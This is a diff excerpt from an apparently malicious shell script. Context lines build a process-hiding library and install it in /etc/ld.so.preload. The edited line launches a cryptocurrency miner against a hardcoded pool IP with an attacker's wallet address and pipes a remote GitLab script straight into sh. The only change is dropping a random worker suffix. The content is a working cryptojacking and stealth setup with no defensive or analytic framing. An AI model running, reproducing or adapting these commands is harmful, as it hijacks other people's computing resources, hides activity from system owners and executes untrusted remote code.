@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.81 --algo KARLSEN --pool stratum+tcp://165.227.180.199:443 --user pugdag:qq9s7xscv5j0m776jf3djpupcxvkfcf4aj488yfsfj05vzg4q3rtxprkrudwg.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./lol1.81 --algo KARLSEN --pool stratum+tcp://165.227.180.199:443 --user pugdag:qq9s7xscv5j0m776jf3djpupcxvkfcf4aj488yfsfj05vzg4q3rtxprkrudwg.Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
